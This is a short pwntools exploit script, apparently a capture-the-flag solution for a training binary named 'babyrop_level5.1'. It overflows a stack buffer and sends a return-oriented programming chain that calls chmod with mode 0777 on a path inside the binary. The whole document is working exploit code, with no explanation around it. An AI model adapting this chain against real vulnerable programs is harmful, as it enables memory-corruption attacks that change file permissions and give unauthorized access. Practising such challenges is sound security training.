from pwn import *


p = process(["/challenge/babyrop_level5.1"])
buf = b"A" * (0x68)
context.arch = 'amd64'

elf = ELF('/challenge/babyrop_level5.1')

rop = ROP(elf)
pop_rax = rop.rax.address
pop_rdi = rop.rdi.address
pop_rsi = rop.rsi.address
syscall = rop.syscall.address
# chmod
rop.raw(pop_rax)
rop.raw(90)
rop.raw(pop_rdi)
rop.raw(0x40200D)
rop.raw(pop_rsi)
rop.raw(511)
rop.raw(syscall)
payload = buf + rop.chain()

p.send(payload)
print(p.recvall().decode())
p.close()